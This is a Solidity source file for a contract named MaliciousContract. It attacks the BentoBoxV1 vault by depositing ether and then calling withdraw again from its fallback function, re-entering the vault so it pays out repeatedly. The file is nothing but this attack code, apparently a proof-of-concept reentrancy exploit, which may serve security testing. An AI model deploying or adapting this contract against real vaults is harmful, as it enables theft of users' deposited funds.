// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract

contract MaliciousContract {
    address public owner;
    BentoBoxV1 public targetContract;
    uint256 public amount;

    event AttackExecuted(uint256 amount);
    event WithdrawExecuted(uint256 amount);
    event BalanceBeforeAttack(uint256 balance);

    // Make _targetContract a payable address
    constructor(address payable _targetContract) public {
        owner = msg.sender;
        targetContract = BentoBoxV1(_targetContract);
    }

    // Receive function to handle incoming Ether
    receive() external payable {}

    fallback() external payable {
        uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this));
        if (balance > 0) {
            emit BalanceBeforeAttack(balance);
            // Attempt to withdraw in a loop to reenter the vulnerable contract
            targetContract.withdraw(IERC20(address(0)), address(this), owner, balance, 0);
            emit WithdrawExecuted(balance);
        }
    }

    function attack(uint256 _amount) external {
        require(msg.sender == owner, "Not the owner");
        amount = _amount;

        // Deposit small initial amount to initiate the attack
        targetContract.deposit{value: amount}(IERC20(address(0)), address(this), address(this), amount, 0);

        // Reenter the target contract by calling withdraw repeatedly
        targetContract.withdraw(IERC20(address(0)), address(this), owner, amount, 0);

        emit AttackExecuted(amount);
    }
}
